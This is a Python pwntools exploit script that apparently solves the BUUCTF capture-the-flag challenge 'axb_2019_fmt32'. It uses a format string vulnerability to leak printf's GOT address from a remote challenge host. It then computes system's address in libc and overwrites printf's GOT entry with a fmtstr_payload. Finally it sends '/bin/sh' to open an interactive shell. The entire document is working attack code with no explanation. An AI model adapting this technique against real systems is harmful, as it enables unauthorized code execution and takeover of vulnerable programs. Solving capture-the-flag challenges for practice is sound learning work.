#!/usr/bin/env python3

from pwn import *
from LibcSearcher import *

context(os = 'linux',arch = 'i386',log_level = 'debug')

file_name = './axb_2019_fmt32'
lib_name = '/home/ra4ing/tools/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc.so.6'
debug = 0
if debug:
    p = process(file_name)
    context.terminal = ['tmux','splitw','-h']
    # gdb.attach(p)
else:
    ip = 'node5.buuoj.cn'
    port = '25972'
    p = remote(ip, port)
elf = ELF(file_name)
rop = ROP(file_name)
libc = ELF(lib_name)

printf_got = elf.got['printf']
payload = b'a' + p32(printf_got) + b'b' + b'%8$s'

p.recvuntil(b'Please tell me:')
p.send(payload)
p.recvuntil(b'b')
printf_addr = u32(p.recv(4))
success(hex(printf_addr))

# libc = LibcSearcher('printf', printf_addr)
libc_base = printf_addr - libc.sym['printf']
system_addr = libc_base + libc.sym['system']

payload = b'a' + fmtstr_payload(8, {printf_got: system_addr}, write_size="byte", numbwritten=0xa) 
p.recvuntil(b'Please tell me:')
p.sendline(payload)
p.sendline(b'/bin/sh;\x00')

p.interactive()
